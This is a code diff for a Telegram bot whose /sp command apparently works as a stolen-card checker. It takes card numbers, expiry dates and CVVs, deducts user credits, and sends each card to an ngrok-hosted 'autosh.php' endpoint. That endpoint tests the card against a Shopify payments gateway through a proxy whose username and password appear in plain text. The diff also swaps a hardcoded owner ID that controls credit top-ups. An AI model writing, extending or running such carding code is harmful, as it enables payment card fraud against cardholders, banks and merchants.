@@ -922,7 +922,7 @@ from telegram.helpers import escape_markdown as escape_markdown_v2
 async def adcr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Adds a specified number of credits to a user's account, restricted to a specific owner."""
     # Owner ID is hardcoded
-    OWNER_ID = 8438505794
+    OWNER_ID = 8406230162
 
     # Check if the user is the owner
     if update.effective_user.id != OWNER_ID:
@@ -2746,6 +2746,7 @@ from datetime import datetime
 from telegram import Update
 from telegram.constants import ParseMode
 from telegram.ext import ContextTypes
+from db import get_user, update_user, init_db, consume_credit
 
 logger = logging.getLogger(__name__)
 
@@ -2794,95 +2795,106 @@ async def get_bin_details(bin_number: str) -> dict:
 
     return bin_data
 
-import asyncio
-import aiohttp
-import json
-from html import escape
-from telegram import Update
-from telegram.constants import ParseMode
-from telegram.ext import ContextTypes
-from db import get_user, update_user, init_db
-
-# Ensure DB is initialized
+# --- Ensure DB is initialized ---
 asyncio.get_event_loop().run_until_complete(init_db())
 
-async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# --- /sp command ---
+async def sp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
+
+    # ✅ Cooldown enforcement
+    if not await enforce_cooldown(user_id, update):
+        return
 
     # --- Check arguments ---
     if not context.args:
         await update.message.reply_text(
-            "❌ Usage: /sp <card_number|mm|yyyy|cvv>",
+            "⚠️ Usage: <code>/sp card|mm|yyyy|cvv</code>",
             parse_mode=ParseMode.HTML
         )
         return
 
-    card_input = context.args[0].strip()
+    payload = " ".join(context.args).strip()
+    parts = payload.split("|")
+    if len(parts) != 4:
+        await update.message.reply_text(
+            "❌ Invalid format.\nUse: <code>/sp 1234567812345678|12|2028|123</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
 
-    # --- Fetch BIN info from your DB or API ---
-    bin_number = card_input.split("|")[0][:6]
-    user_data = await get_user(user_id)
-    bin_details = user_data.get("bin_info", {})  # Optional: store bin info per user
-    brand = bin_details.get("scheme", "N/A").upper()
-    bank = bin_details.get("bank", "N/A").title()
-    country_name = bin_details.get("country_name", "N/A")
-    country_flag = bin_details.get("country_emoji", "")
-
-    # --- Send processing message ---
-    processing_msg = await update.message.reply_text(
-        f"⏳ Checking card: <code>{escape(card_input)}</code>...",
-        parse_mode=ParseMode.HTML
-    )
-
-    # --- Prepare API URL ---
-    api_url = (
-        "https://7feeef80303d.ngrok-free.app/autosh.php"
-        f"?cc={card_input}"
-        "&site=https://example.com"
-        "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
-    )
+    cc, mm, yy, cvv = [p.strip() for p in parts]
 
     try:
+        # --- Consume credit ---
+        has_credit = await consume_credit(user_id)
+        if not has_credit:
+            await update.message.reply_text("❌ You don’t have enough credits left.")
+            return
+
+        # --- Send processing message ---
+        processing_msg = await update.message.reply_text(
+            f"⏳ Processing card: <code>{escape(payload)}</code>…",
+            parse_mode=ParseMode.HTML
+        )
+
+        # --- API URL ---
+        api_url = (
+            "https://7feeef80303d.ngrok-free.app/autosh.php"
+            f"?cc={cc}|{mm}|{yy}|{cvv}"
+            "&site=https://example.com"
+            "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+        )
+
+        # --- Call API ---
         async with aiohttp.ClientSession() as session:
             async with session.get(api_url, timeout=50) as resp:
                 api_response = await resp.text()
 
-        # --- Parse JSON safely ---
+        # --- Parse API response ---
         try:
             data = json.loads(api_response)
         except json.JSONDecodeError:
             data = {"Response": api_response.strip(), "Price": "-"}
 
-        # --- Extract API fields ---
-        response = data.get("Response", "Unknown")
+        response_text = data.get("Response", "Unknown")
         amount = data.get("Price", "-")
-        gateway_name = data.get("Gateway", "shopify_payments")
-        brand_name = data.get("Brand", brand)
-        bank_name = data.get("Bank", bank)
-        country_display = data.get("Country", f"{country_flag} {country_name}")
+        gateway = data.get("Gateway", "Shopify Payments")
 
-        # --- Format message ---
+        # --- BIN lookup ---
+        bin_number = cc[:6]
+        bin_details = await get_bin_details(bin_number)
+        brand = (bin_details.get("scheme") or "N/A").upper()
+        bank = (bin_details.get("bank") or "N/A").title()
+        country_name = (bin_details.get("country_name") or "N/A")
+        country_flag = bin_details.get("country_emoji", "")
+
+        # --- Fetch updated credits ---
+        updated_user = await get_user(user_id)
+        credits_left = updated_user.get("credits", 0)
+
+        # --- Prepare message ---
         requester = f"@{user.username}" if user.username else str(user.id)
         DEVELOPER_NAME = "kคli liຖนxx"
         DEVELOPER_LINK = "https://t.me/K4linuxxxx"
         developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"
 
-        BULLET_GROUP_LINK = "https://t.me/YourGroupHere"  # <-- replace with your link
+        BULLET_GROUP_LINK = "https://t.me/YourGroupHere"
         bullet_link = f"[<a href='{BULLET_GROUP_LINK}'>✗</a>]"
 
         formatted_msg = (
-            f"═══[ SHOPIFY_PAYMENTS ]═══\n"
-            f"{bullet_link} <b>Card</b> ➜ <code>{escape(card_input)}</code>\n"
-            f"{bullet_link} <b>Gateway</b> ➜ {escape(gateway_name)}\n"
+            f"═══[ <b>{gateway.upper()}</b> ]═══\n"
+            f"{bullet_link} <b>Card</b> ➜ <code>{escape(payload)}</code>\n"
             f"{bullet_link} <b>Amount</b> ➜ {escape(str(amount))}\n"
-            f"{bullet_link} <b>Response</b> ➜ <i>{escape(response)}</i>\n"
+            f"{bullet_link} <b>Response</b> ➜ <i>{escape(response_text)}</i>\n"
             f"――――――――――――――――\n"
-            f"{bullet_link} <b>Brand</b> ➜ {escape(brand_name)}\n"
-            f"{bullet_link} <b>Bank</b> ➜ {escape(bank_name)}\n"
-            f"{bullet_link} <b>Country</b> ➜ {escape(country_display)}\n"
+            f"{bullet_link} <b>Brand</b> ➜ {brand}\n"
+            f"{bullet_link} <b>Bank</b> ➜ {bank}\n"
+            f"{bullet_link} <b>Country</b> ➜ {country_name} {country_flag}\n"
             f"――――――――――――――――\n"
             f"{bullet_link} <b>Requested By</b> ➜ {requester}\n"
+            f"{bullet_link} <b>Credits Left</b> ➜ {credits_left}\n"
             f"{bullet_link} <b>Developer</b> ➜ {developer_clickable}\n"
             f"――――――――――――――――"
         )
@@ -2899,12 +2911,12 @@ async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode=ParseMode.HTML
         )
     except Exception as e:
-        import logging
-        logging.exception("Error in /sp")
+        logger.exception("Error in /sp")
         await processing_msg.edit_text(
             f"❌ Error: <code>{escape(str(e))}</code>",
             parse_mode=ParseMode.HTML
         )
+
 
 
 
